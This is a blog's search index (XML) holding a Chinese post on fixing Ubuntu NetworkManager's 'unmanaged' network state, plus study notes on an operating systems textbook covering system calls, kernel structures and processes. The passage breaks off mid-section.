<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/11/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%AA%E6%89%98%E7%AE%A1%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2021/11/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%AA%E6%89%98%E7%AE%A1%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<hr><p>title:虚拟机网络托管消失的问题</p><p>tags:linux网络问题</p><p>categories:bug</p><h2 id="excerpt-解决虚拟机无法联网的问题"><a href="#excerpt-解决虚拟机无法联网的问题" class="headerlink" title="excerpt:解决虚拟机无法联网的问题"></a>excerpt:解决虚拟机无法联网的问题</h2><p>如图所示，Ubuntu20.04频繁出现网络为托管的现象，右上角网络连接图标消失</p><p><img src="/2021/11/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%AA%E6%89%98%E7%AE%A1%E7%9A%84%E9%97%AE%E9%A2%98/image-20211127204523849.png" alt="image-20211127204523849"></p><p><strong>在Desktop版本中，除了可以修改/etc/network/interfaces来进行配置以外；还可以直接在network-manager中配置。通过 interfaces修改的方法参照Server版本。network-manager的配置很直观，按照提示一步一步操作即可，有兴趣的朋友，可以自行Google或者Baidu。</strong></p><p><strong>但如果修改了interfaces，又配置了network-manager（以下简称nm），你就会发现出现了一些莫名其妙的问题：</strong></p><p><strong>1，interfaces和 nm中的网络设置不一样，系统实际的IP是哪个？</strong></p><p><strong>2，有时候莫名其妙的，界面右上角的网络连接图标就丢失了。</strong></p><p><strong>3，明明在nm中配置了正确的网络设置，为什么就上不了网呢？</strong></p><p><strong>其实，我们要知道 interfaces和 nm之间的关系，这些问题就不难解释了。</strong></p><p><strong>首先，当系统内没有第三方网络管理工具（比如nm）时，系统默认使用interfaces文件内的参数进行网络配置。（就像Server版本一样）</strong></p><p><strong>接着，当系统内安装了 nm之后，nm默认接管了系统的网络配置，使用nm 自己的网络配置参数来进行配置。</strong></p><p><strong>但是，如果用户在安装nm之后（Desktop版本默认安装了nm），自己手动修改了interfaces 文件，那nm 就自动停止对系统网络的管理，系统改使用interfaces 文件内的参数进行网络配置。</strong></p><p><strong>此时，再去修改nm 内的参数，不影响系统实际的网络配置。若要让nm 内的配置生效，必须重新启用nm 接管系统的网络配置。</strong></p><p><strong>现在知道了两者之间的工作关系，再看上面的三个问题：</strong></p><p><strong>1，要看nm是否接管，如果没有接管，系统实际的IP设置以interfaces 中的为准。反之，以nm 中的为准。</strong></p><p><strong>2，当nm 停止接管的时候，网络连接图标就丢失了。</strong></p><p><strong>3，同样是接管的问题。</strong></p><p><strong>如果用户希望在Desktop版本中，直接使用interfaces 进行网络配置，那最好删除network-manager 。</strong></p><p><strong>如果在出现上述问题之后，希望能继续使用nm 来进行网络配置，则需要进行如下操作：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs terminal">sudo servicenetwork-manager stop # 停止 nm服务**<br><br>sudo rm/var/lib/NetworkManager/NetworkManager.state # 移除nm 的状态文件**<br><br>sudo gedit/etc/NetworkManager/nm-system-settings.conf # 打开nm 的配置文件**<br></code></pre></td></tr></table></figure><p><strong>里面有一行：managed=true</strong></p><p><strong>如果你手工改过/etc/network/interfaces，nm会自己把这行改成：managed=false</strong></p><p><strong>将false 修改成true</strong> </p><p><strong>sudo servicenetwork-manager start</strong></p><p>然后reboot重启电脑，或者直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs terminal"># 开启NM托管<br>nmcli n on<br></code></pre></td></tr></table></figure><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/vic_qxz/article/details/118863177?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-2&spm=1001.2101.3001.4242.1"> NetworkManager设置_networkmanager配置文件</a></p><p><a href="https://www.cnblogs.com/sankye/p/5020721.html?ivk_sa=1024320u">Ubuntu中启用关闭Network-manager网络设置问题</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>操作系统笔记</title>
    <link href="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/"/>
    <url>/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统概念"><a href="#操作系统概念" class="headerlink" title="操作系统概念"></a>操作系统概念</h1><h2 id="第1章-导论"><a href="#第1章-导论" class="headerlink" title="第1章 导论"></a>第1章 导论</h2><h3 id="1-1-操作系统做什么"><a href="#1-1-操作系统做什么" class="headerlink" title="1.1 操作系统做什么"></a>1.1 操作系统做什么</h3><p>计算机系统可以大致分为4个组成部分：计算机硬件、操作系统、系统程序与应用程序和用户。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114101353468.png" alt="image-20211114101353468"></p><p><strong>定义操作系统</strong>：</p><p>操作系统是一直运行在计算机上的程序（通常称为内核），其他程序则为系统程序和应用程序。</p><h3 id="1-2-计算机系统组织"><a href="#1-2-计算机系统组织" class="headerlink" title="1.2 计算机系统组织"></a>1.2 计算机系统组织</h3><p><strong>1.2.1 计算机系统操作</strong></p><p><strong>1.2.2 存储结构</strong></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114104118324.png" alt="image-20211114104118324"></p><p><strong>1.2.3 I/O结构</strong></p><h3 id="1-3-计算机系统体系结构"><a href="#1-3-计算机系统体系结构" class="headerlink" title="1.3 计算机系统体系结构"></a>1.3 计算机系统体系结构</h3><p><strong>1.3.1 单处理器系统</strong></p><p><strong>1.3.2 多处理器系统</strong></p><p><strong>1.3.3 集群系统</strong></p><p>与多处理器系统一样， 集群系统将多个CPU集中起来完成计算任务。然而，集群系统与多处理器系统不同，它是由两个或多个独立的系统藕合起来的。</p><h3 id="1-4-操作系统结构"><a href="#1-4-操作系统结构" class="headerlink" title="1.4 操作系统结构"></a>1.4 操作系统结构</h3><h3 id="1-5-操作系统操作"><a href="#1-5-操作系统操作" class="headerlink" title="1.5 操作系统操作"></a>1.5 操作系统操作</h3><p>1.5.1 双重模式操作<br>1.5.2 定时器</p><h3 id="1-6-进程管理"><a href="#1-6-进程管理" class="headerlink" title="1.6 进程管理"></a>1.6 进程管理</h3><h3 id="1-7-内存管理"><a href="#1-7-内存管理" class="headerlink" title="1.7 内存管理"></a>1.7 内存管理</h3><h3 id="1-8-存储管理"><a href="#1-8-存储管理" class="headerlink" title="1.8 存储管理"></a>1.8 存储管理</h3><p>1.8.1 文件系统管理<br>1.8.2 大容量存储器管理<br>1.8.3 高速缓存<br>1.8.4 V/O系统</p><h3 id="1-9-保护和安全"><a href="#1-9-保护和安全" class="headerlink" title="1.9 保护和安全"></a>1.9 保护和安全</h3><h3 id="1-10-分布式系统"><a href="#1-10-分布式系统" class="headerlink" title="1.10 分布式系统"></a>1.10 分布式系统</h3><h3 id="1-11-专用系统"><a href="#1-11-专用系统" class="headerlink" title="1.11 专用系统"></a>1.11 专用系统</h3><p>1.111 实时嵌入式系统<br>1.11.2 多媒体系统<br>1.11.3 手持系统</p><h3 id="1-12-计算环境"><a href="#1-12-计算环境" class="headerlink" title="1.12 计算环境"></a>1.12 计算环境</h3><p>1.12.1 传统计算<br>1.12.2 客户机服务器计算<br>1.12.3 对等计算<br>1.12.4 基于Web的计算</p><h2 id="第2章-操作系统结构"><a href="#第2章-操作系统结构" class="headerlink" title="第2章 操作系统结构"></a>第2章 操作系统结构</h2><h3 id="2-1-操作系统服务"><a href="#2-1-操作系统服务" class="headerlink" title="2.1 操作系统服务"></a>2.1 操作系统服务</h3><ul><li><p><strong>用户界面</strong>：</p><ul><li>一种是命令行界面（command-line interface CLI）， 它采用文本命令， 并用一定的方法输入（即一种允许输入并编辑的命令〉。</li><li>另一种是批界面， 其中控制这些命令和命令的指令被输入文件中，通过执行文件来实现。</li><li>最为常用的是图形用户界面（graphical user interface,GUI)， 此时界面是一个视窗系统， 它具有定位设备来指挥I/O、从菜单来选择、选中部分并用键盘输入文本。有些系统还提供了两种甚至所有这三种界面。</li></ul></li><li><p><strong>程序执行</strong>： 系统必须能将程序装入内存并运行程序。程序必须能结束执行， 包括正常或不正常结束（指明错误）。</p></li><li><p><strong>I/O操作</strong>：运行程序可能需要I/O，这些I/O 可能涉及文件或设备。对于特定设备，需要特定的功能（如刻录CD或DVD驱动器，或清屏）。为了提高效率和进行保护， 用户通常不能直接控制νo设备。因此，操作系统必须提供进行I/O操作的方法。</p></li><li><p><strong>文件系统操作</strong>： 文件系统特别重要。很明显， 程序需要读写文件和目录， 也需要根据文件名来创建和删除文件、搜索一个给定的文件、列出文件信息。最后，有些程序还包括了基于文件所有权的允许或拒绝对文件或目录的访问管理。</p></li><li><p><strong>通信</strong>：在许多情况下，一个进程需要与另一个进程交换信息。这种通信有两种主要形式。一种是发生在同一台计算机运行的两个进程之间。另一种是运行在由网络连接起来<br>的不同的计算机上的进程之间。通信可以通过共事冲序来实现，也可通过信息交换技术来实现（对于消息交换，消息包通过操作系统在进程之间移动）。</p></li><li><p><strong>错误检测</strong>：操作系统需要时刻知道可能出现的错误。</p></li><li><p><strong>资源分配</strong>：当多个用户或多个作业同时运行时，必须为每一个分配资源。</p></li><li><p><strong>统计</strong>：跟踪记录那些用户使用了多少资源和什么类型的资源。</p></li><li><p><strong>保护和安全</strong>：多进程并发执行时，一个进程不能干预另一个进程或操作系统本身。</p></li></ul><h3 id="2-2-操作系统的用户界面"><a href="#2-2-操作系统的用户界面" class="headerlink" title="2.2 操作系统的用户界面"></a>2.2 操作系统的用户界面</h3><h4 id="2-2-1-命令解释程序"><a href="#2-2-1-命令解释程序" class="headerlink" title="2.2.1 命令解释程序"></a>2.2.1 命令解释程序</h4><p>具有多个命令解释程序选择的系统中， 解释程序被称为外壳(Shell）。例如，在UNIX 和Linux 系统中，有多种不同的Shell 可供用户选择，包括：Bourne Shell、C Shell、Bourne-Again Shell、Korn Shell 等。</p><h4 id="2-2-2-图形用户界面"><a href="#2-2-2-图形用户界面" class="headerlink" title="2.2.2 图形用户界面"></a>2.2.2 图形用户界面</h4><p>与用户通过命令行直接输入命令不同， GUI 允许提供基于鼠标的窗口和菜单系统作为接口。</p><h3 id="2-3-系统调用"><a href="#2-3-系统调用" class="headerlink" title="2.3 系统调用"></a>2.3 系统调用</h3><p>系统调用Csystem call）提供了操作系统提供的有效服务界面。</p><p>系统调用提供了进程与操作系统之间的接口</p><p><strong>系统调用</strong></p><p>操作系统服务的编程接口<br>通常由高级语言编写（C或C++）<br>程序访问通常通过高层次 的API接口（C标准库的库函数）而不是直接进行系统调用<br>每个系统调用对应一个系统调用编号</p><h4 id="系统调用与函数调用的区别"><a href="#系统调用与函数调用的区别" class="headerlink" title="系统调用与函数调用的区别"></a><strong>系统调用与函数调用的区别</strong></h4><p><strong>系统调用</strong></p><ol><li><p>使用INT和IRET指令，内核和应用程序使用的是不同的堆栈，因此存在堆栈的切换，从用户态切换到内核态，从而可以使用特权指令操控设备</p></li><li><p>依赖于内核，不保证移植性</p></li><li><p>在用户空间和内核上下文环境间切换，开销较大</p></li><li><p>是操作系统的一个入口点</p></li></ol><p><strong>函数调用</strong></p><ol><li>使用CALL和RET指令，调用时没有堆栈切换</li><li>平台移植性好</li><li>属于过程调用，调用开销较小</li><li>一个普通功能函数的调用</li></ol><h4 id="API与系统调用"><a href="#API与系统调用" class="headerlink" title="API与系统调用"></a>API与系统调用</h4><p><strong>API</strong>是函数的定义，规定了这个函数的功能，跟内核无直接关系。</p><p><strong>系统调用</strong>是通过中断向内核发请求，实现内核提供的某些服务。     </p><p><strong>联系</strong>：一个API可能会需要一个或多个系统调用来完成特定功能。通俗点说就是如果这个api需要跟内核打交道就需要系统调用，否则不需要。 程序员调用的是API（API函数），然后通过与系统调用共同完成函数的功能。 </p><p>API是一个提供给应用程序的接口，一组函数，是与程序员进行直接交互的。 系统调用则不与程序员进行交互的，它根据API函数，通过一个软中断机制向内核提交请求，以获取内核服务的接口。   </p><p>并不是所有的API函数都一一对应一个系统调用。一个API函数可能需要几个系统调用来共同完成函数的功能。一些API函数不需要调用相应的系统调用（因此它所完成的不是内核提供的服务）</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114112604666.png" alt="image-20211114112604666"></p><h3 id="2-4-系统调用类型"><a href="#2-4-系统调用类型" class="headerlink" title="2.4 系统调用类型"></a>2.4 系统调用类型</h3><h4 id="2-4-1-进程控制"><a href="#2-4-1-进程控制" class="headerlink" title="2.4.1 进程控制"></a>2.4.1 进程控制</h4><ul><li>结束， 放弃</li><li>装入， 执行</li><li>创建进程， 终止进程</li><li>取得进程属性， 设置进程属性</li><li>等待时间</li><li>等待事件， 唤醒事件</li><li>分配和释放内存</li></ul><h4 id="2-4-2-文件管理"><a href="#2-4-2-文件管理" class="headerlink" title="2.4.2 文件管理"></a>2.4.2 文件管理</h4><ul><li>创建文件， 删除文件</li><li>打开， 关闭</li><li>读、写、重定位</li><li>取得文件属性， 设置文件属性</li></ul><h4 id="2-4-3-设备管理"><a href="#2-4-3-设备管理" class="headerlink" title="2.4.3 设备管理"></a>2.4.3 设备管理</h4><ul><li>请求设备， 释放设备</li><li>读、写、重定位</li><li>取得设备属性， 设置设备属性</li><li>逻辑连接或断开设备</li></ul><h4 id="2-4-4-信息维护"><a href="#2-4-4-信息维护" class="headerlink" title="2.4.4 信息维护"></a>2.4.4 信息维护</h4><ul><li>读取时间或日期， 设置时间或日期</li><li>读取系统数据， 设置系统数据</li><li>读取进程， 文件或设备属性</li><li>设置进程， 文件或设备属性</li></ul><h4 id="2-4-5-通信"><a href="#2-4-5-通信" class="headerlink" title="2.4.5 通信"></a>2.4.5 通信</h4><ul><li>创建， 删除通信连接</li><li>发送， 接受消息</li><li>传递状态消息</li><li>连接或断开远程设备</li></ul><h3 id="2-5-系统程序"><a href="#2-5-系统程序" class="headerlink" title="2.5 系统程序"></a>2.5 系统程序</h3><p>系统程序提供了一个方便的环境， 以开发程序和执行程序。其中一小部分只是系统调用的简单接口， 其他的可能是相当复杂的。它们可分为如下几类：</p><ul><li><strong>文件管理</strong>：这些程序创建、删除、复制、重新命名、打印、转储、列出和操作文件和目录。</li><li><strong>状态信息</strong>：一些程序从系统那里得到日期、时间、可用内存或磁盘空间的数量、用户数或类似状态信息。另一些更为复杂， 能提供详细的性能、登录和调试信息。通常， 这些信息经格式化后，再打印到终端、输出设备或文件， 或在GUI的窗体上显示。有些系统还支持注册衰，它被用于存储和检索配置信息。</li><li><strong>文件修改</strong>：－ 有多个编辑器可以创建和修改位于磁盘或其他存储设备上的文件内容。也可能有特殊的命令被用于查找文件内容或完成文本的转换。</li><li><strong>程序语言支持</strong>： 常用程序设计语言（如C、C＋＋、Java、Visual Basic和Perl等〉的编译程序、汇编程序、调试程序和解释程序通常与操作系统一起提供给用户。</li><li><strong>程序装入和执行</strong>：一旦程序汇编或编译后， 它必须装入内存才能执行。系统可能要提供绝对加载程序、重定位加载程序、链接编辑器和覆盖式加载程序。系统还需要有高级语言或机器语言的调试程序。</li><li><strong>通信</strong>：这些程序提供了在进程、用户和计算机系统之间创建虚拟连接的机制。它们允许用户在互相的屏幕上发送消息， 浏览网页， 发送电子邮件， 远程登录， 从一台机器向另一台机器传送文件。</li></ul><h3 id="2-6-操作系统设计和实现"><a href="#2-6-操作系统设计和实现" class="headerlink" title="2.6 操作系统设计和实现"></a>2.6 操作系统设计和实现</h3><h4 id="2-6-1-设计目标"><a href="#2-6-1-设计目标" class="headerlink" title="2.6.1 设计目标"></a>2.6.1 设计目标</h4><h4 id="2-6-2-机制与策略"><a href="#2-6-2-机制与策略" class="headerlink" title="2.6.2 机制与策略"></a>2.6.2 机制与策略</h4><h4 id="2-6-3-实现"><a href="#2-6-3-实现" class="headerlink" title="2.6.3 实现"></a>2.6.3 实现</h4><h3 id="2-7-操作系统结构"><a href="#2-7-操作系统结构" class="headerlink" title="2.7 操作系统结构"></a>2.7 操作系统结构</h3><h4 id="2-7-1-简单结构"><a href="#2-7-1-简单结构" class="headerlink" title="2.7.1 简单结构"></a>2.7.1 简单结构</h4><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114121729295.png" alt="image-20211114121729295"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114121720130.png" alt="image-20211114121720130"></p><h4 id="2-7-2-分层方法"><a href="#2-7-2-分层方法" class="headerlink" title="2.7.2 分层方法"></a>2.7.2 分层方法</h4><ul><li><p>操作系统被划分为若干层级，每一层都建立在较低层之上</p></li><li><p>模块化</p></li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114122235688.png" alt="image-20211114122235688"></p><ul><li><p>优点</p><ul><li>便于构造和调试  简化系统设计和实现</li></ul></li><li><p>不足</p><ul><li>定义和划分困难  效率相对要低一些</li></ul></li></ul><h4 id="2-7-3-微内核"><a href="#2-7-3-微内核" class="headerlink" title="2.7.3 微内核"></a>2.7.3 微内核</h4><ul><li><p>这种方法将所有非基本部分从内核中移走，并将它们当做系统级程序和用户级程序来实现，用这种方法来构建操作系统</p></li><li><p>用户模块之间采用消息传递的方式进行通信</p></li><li><p>优点</p><ul><li>微内核易于扩展</li><li>易于提升OS至一个新的体系结构</li><li>更可靠（内核模式中运行的代码更少）</li><li>更安全</li></ul></li><li><p>缺点</p><ul><li>用户空间与内核空间的通信代价较高</li></ul></li></ul><h4 id="2-7-4-模块"><a href="#2-7-4-模块" class="headerlink" title="2.7.4 模块"></a>2.7.4 模块</h4><p>用面向对象编程技术来生成模块化的内核。这里， 内核有一组核心部件， 以及在启动或运行时对附加服务的动态链接。</p><ul><li>用面向对象的方法</li><li>内核的组成部分相互分离</li><li>任务之间的交互通过已知的接口来实现</li><li>每个模块在内核中是按照需要可装载的</li><li>比分层系统更为灵活</li><li>比微内核更高效（不需要调用消息传递来通信）</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114122827683.png" alt="image-20211114122827683"></p><h3 id="2-8-虚拟机"><a href="#2-8-虚拟机" class="headerlink" title="2.8 虚拟机"></a>2.8 虚拟机</h3><h4 id="2-8-1-实现"><a href="#2-8-1-实现" class="headerlink" title="2.8.1 实现"></a>2.8.1 实现</h4><h4 id="2-8-2-优点"><a href="#2-8-2-优点" class="headerlink" title="2.8.2 优点"></a>2.8.2 优点</h4><ul><li>通过完全保护系统资源，虚拟机提供了一个坚实的安全层</li><li>虚拟机允许进行系统开发而不必中断正常的系统操作</li></ul><p>缺点</p><ul><li>虚拟机概念很难提供真实的硬件效果</li></ul><h4 id="2-8-3-实例"><a href="#2-8-3-实例" class="headerlink" title="2.8.3 实例"></a>2.8.3 实例</h4><h3 id="2-9-系统生成"><a href="#2-9-系统生成" class="headerlink" title="2.9 系统生成"></a>2.9 系统生成</h3><h3 id="2-10-系统启动"><a href="#2-10-系统启动" class="headerlink" title="2.10 系统启动"></a>2.10 系统启动</h3><h3 id="2-11-小结"><a href="#2-11-小结" class="headerlink" title="2.11 小结"></a>2.11 小结</h3><h3 id="2-12-习题"><a href="#2-12-习题" class="headerlink" title="2.12 习题"></a>2.12 习题</h3><p><strong>2.1 操作系统提供的服务和功能可以主要分为两大类。简要描述这两大类并讨论它们的区别。</strong></p><blockquote><p>第一种操作系统提供的服务是<strong>用来保护在系统中同时运行的不同进程</strong>。进程只被允许获得与它们地址空间有联系的内存位置。同样，进程不允许破坏和其他用户有关的文件。一个进程同样不允许在没有操作系统的干预<br>下直接进入设备。</p><p>第二种服务由操作系统提供的服务是<strong>提供一种新的功能，而这种功能并不直接被底层的硬件支持</strong>。虚拟存储器和文件系统就是由操作系统提供的这种新服务的实例。</p></blockquote><p><strong>2.2 列出操作系统提供使用户更为方便地使用计算机系统的5个服务，并说明在哪些情况下用户级程序不能够提供这些服务。请解释为什么。</strong></p><blockquote><p>2.1操作系统服务</p></blockquote><p><strong>2.3 给出三种向操作系统传递参数的常用方法。</strong></p><blockquote><ol><li>通过寄存器来传递参数</li><li>寄存器传递参数块的首地址</li><li>参数通过程序存放或压进堆栈中， 并通过操作系统弹出堆栈。</li></ol></blockquote><p><strong>2.4 介绍一下如何获得一个程序在执行其不同部分的代码时所耗时间的统计简衰。讨论获得该统计简表的重要性。</strong></p><p><strong>2.5 操作系统关于文件管理的5个主要功能是什么？</strong></p><blockquote><p>2.4.2</p></blockquote><p><strong>2.6 操作文件和设备时，采用同样的系统调用界面有什么优点和缺点？</strong></p><p><strong>2.7 命令解释器的用途是什么？为什么它经常是与内核分开的？是否可能采用操作系统提供的系统调用接口为用户开发一个新的命令解释器？</strong></p><p><strong>2.8 进程间通信的两个模式是什么？这两种方法有何长处和缺点？</strong></p><blockquote><p>共享内存系统</p><ul><li><p>优点</p><ul><li>最快的一种通信方式，多个进程可同时访问同一片内存空间，相对其他方式来说具有更少的数据拷贝，效率较高。</li><li>随内核持续，相比于随进程持续生命力更强。</li></ul></li><li><p>缺点</p><p>需要结合信号灯或其他方式来实现多个进程间同步，自身不具备同步机制。</p></li></ul><p>消息传递系统</p><ul><li>优点<ul><li>可以实现通信进程间的同步</li></ul></li><li>缺点<ul><li>效率较低</li></ul></li></ul></blockquote><p><strong>2.9 为什么要将机制和策略区分开来？</strong></p><p><strong>2.10 为什么Java提供从Java程序调用以C或C＋＋编写的本地方法？举出一个本地方法的例子。</strong></p><p><strong>2.11 如果操作系统的两个部件相互依赖，有时实现分层方法会很困难． 请区别两个功能紧密耦合的系统部件如何分层。</strong></p><p><strong>2.12 系统设计采用微内核设计的主要优点是什么？用户程序和系统服务在微内核结构内如何相互影响？采用微内核设计的缺点又是什么？</strong></p><blockquote><p>优点主要包括以下几点：</p><ul><li><p><strong>灵活性高易拓展</strong>,增加一个新的服务不需要修改内核</p></li><li><p>在用户模式中中比在内核模式中<strong>更安全</strong>、更易操作</p></li><li><p>一个简单的内核设计和功能一般导致一个<strong>更可靠</strong>的操作系统</p></li><li><p><strong>可移植性强</strong></p></li><li><p>易于提升OS至一个新的体系结构</p></li></ul><p>用户程序和系统服务通过使用进程件的通信机制在微内核中相互作用，例如发送消息。这些消息由操作系统运送。</p><p>缺点是</p><ul><li>与进程间通信的过度联系和为了保证用户程序和系统服务相互作用而频繁使用操作系统的消息传递功能。使得<strong>效率较低</strong></li></ul></blockquote><p><strong>2.13 模块化内核方法和分层方法在哪些方面类似？哪些方面不同？</strong></p><blockquote><p>二者的相似之处在于实现了系统的模块化设计，每一部分都对外提供接口，便于对系统进行维护和修改。</p><p>二者的区别在于模块化内核方法比分层方法更为灵活，它的任一模块都能调用任何其他模块，提高了系统效率；而分层方法通过层层的系统调用实现上层与下层模块之间的通信，增加了系统开销。</p></blockquote><p><strong>2.14 操作系统设计员采用虚拟机结构的主要优点是什么？对用户来说主要有什么好处？</strong></p><p><strong>2.15 为什么说一个TIT (just-in-time）编译器对执行一个Java程序是有用的？</strong></p><p><strong>2.16 在VMware这样的系统中，客户操作系统与主操作系统有什么关系？选择主操作系统要考虑什么因素？</strong></p><h2 id="第3章-进程"><a href="#第3章-进程" class="headerlink" title="第3章 进程"></a>第3章 进程</h2><h3 id="3-1-进程概念"><a href="#3-1-进程概念" class="headerlink" title="3.1 进程概念"></a>3.1 进程概念</h3><h4 id="3-1-1-进程"><a href="#3-1-1-进程" class="headerlink" title="3.1.1 进程"></a>3.1.1 进程</h4><p><strong>进程</strong>：是一个可并发执行的具有独立功能的程序关于某个数据集合的一次执行过程，也是操作系统进行资源分配和保护的基本单位。</p><p><strong>进程和程序的区别</strong></p><ul><li><p><strong>进程</strong>反映的是一个动态概念，而<strong>程序</strong>是一个静态概念；程序是指令的有序集合，没有任何执行的含义，而进程则强调的是执行过程，它动态被创建、执行和消亡。</p></li><li><p><strong>进程</strong>是一个能独立运行的单位，能与其他进程并发执行，进程是作为资源申请和调度单位存在的。而<strong>程序</strong>则没有。因为程序不反映执行过程。</p></li><li><p>程序和进程并不一定具有一一对应的关系。不同的进程可以来自于同一程序，只要该程序所对应的数据集不同。</p></li></ul><p>进程包括文本段、堆栈段（包括临时数据，如函数参数、返回地址和局部变量）、数据段（包括全局变量）、堆（进程运行时动态分配的内存）</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20210622073331434.png" alt="image-20210622073331434"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024142834120.png" alt="内存中的进程"></p><h4 id="3-1-2-进程状态"><a href="#3-1-2-进程状态" class="headerlink" title="3.1.2 进程状态"></a>3.1.2 进程状态</h4><p>进程在执行时会改变状态。进程状态在某种程度上是由当前活动所定义的。每个进程可能处于下列状态之一：</p><ul><li>新的：进程正在被创建。</li><li>运行： 指令正在被执行。</li><li>等待：进程等待某个事件的发生（如I/O完成或收到信号）。</li><li>就绪：进程等待分配处理器。</li><li>终止：进程完成执行。</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024144135058.png" alt="image-20211024144135058"></p><h4 id="3-1-3-进程控制块"><a href="#3-1-3-进程控制块" class="headerlink" title="3.1.3 进程控制块"></a>3.1.3 进程控制块</h4><p>每个进程在操作系统内用进程控制块（process control block, PCB ，也称为任务控制块）来表示。</p><p>图3.3 给出了一个PCB 的例子， 它包含许多与一个特定进程相关的信息。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024144308211.png" alt="image-20211024144308211"></p><ul><li>进程状态：状态可包括新的、就绪、运行、等待、停止等。</li><li>程序计数器：计数器表示进程要执行的下个指令的地址。</li><li> CPU 寄存器：根据计算机体系结构的不同， 寄存器的数量和类型也不同。它们包括累加器、索引寄存器、堆钱指针、通用寄存器和其他条件码信息寄存器。与程序计数器一起，这些状态信息在出现中断时也需要保存， 以便进程以后能正确地继续执行（见图3.4)。</li><li> CPU 调度信息：这类信息包括进程优先级、调度队列的指针和其他调度参数（第5章讨论进程调度）。</li><li>内存管理信息： 根据操作系统所使用的内存系统， 这类信息包括基址和界限寄存器的值、页表或段表（见第8章）。</li><li>记账信息：这类信息包括CPU时间、实际使用时间、时间界限、记账数据、作业或进程数量等。</li><li> I/O状态信息：这类信息包括分配给进程的I/O设备列表、打开的文件列表等。</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024144700188.png" alt="image-20211024144700188"></p><p><strong>PCB的作用</strong></p><ul><li>PCB可唯一标识一个进程</li><li>PCB中的信息为进程的控制提供依据</li><li>PCB将程序变成了进程</li><li>PCB是进程在系统中存在的唯一标志</li></ul><h4 id="3-1-4-线程"><a href="#3-1-4-线程" class="headerlink" title="3.1.4 线程"></a>3.1.4 线程</h4><p>迄今为止所讨论的进程模型暗示： 一个进程是一个只能进行单个执行线程的程序。例如， 如果一个进程运行一个字处理器程序， 那么只能执行单个线程指令。这种单一控制线程使得进程一次只能执行一个任务。例如， 用户不能在同一进程内， 同时输入字符和进行拼写检查。</p><p>许多现代操作系统扩展了进程概念以支持一次能执行多个线程。第4章将讨论多线程进程。</p><h3 id="3-2-进程调度"><a href="#3-2-进程调度" class="headerlink" title="3.2 进程调度"></a>3.2 进程调度</h3><p>多道程序设计的目的是无论何时都有进程在运行，从而使CPU利用率达到最大化。</p><p>分时系统的目的是在进程之间快速切换CPU以便用户在程序运行时能与其进行交互。</p><h4 id="3-2-1-调度队列"><a href="#3-2-1-调度队列" class="headerlink" title="3.2.1 调度队列"></a>3.2.1 调度队列</h4><p>讨论进程调度的常用表示方法是队列图， 如图3.7 所示。每个长方形表示一个队列。<br>有两种队列： 就绪队列和一组设备队列。圆形表示为队列服务的资源， 箭头表示系统内进程的流向。</p><p>新进程开始处于就绪队列。它在就绪队列中等待直到被选中执行或被派遣。当进程分配到CPU 并执行时， 可能发生下面几种事件中的一种：</p><ul><li>进程可能发出一个I/O请求， 并被放到I/O队列中。</li><li>进程可能创建一个新的子进程， 并等待其结束。</li><li>进程可能会由于中断而强制释放CPU， 并被放回到就绪队列中。</li></ul><p>对于前两种情况， 进程最终从等待状态切换到就绪态， 并放回到就绪队列中。进程继续这一循环直到终止， 到时它将从所有队列中删除， 其PCB 和资源将得以释放。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211025195355812.png" alt="image-20211025195355812"></p><h4 id="3-2-2-调度程序"><a 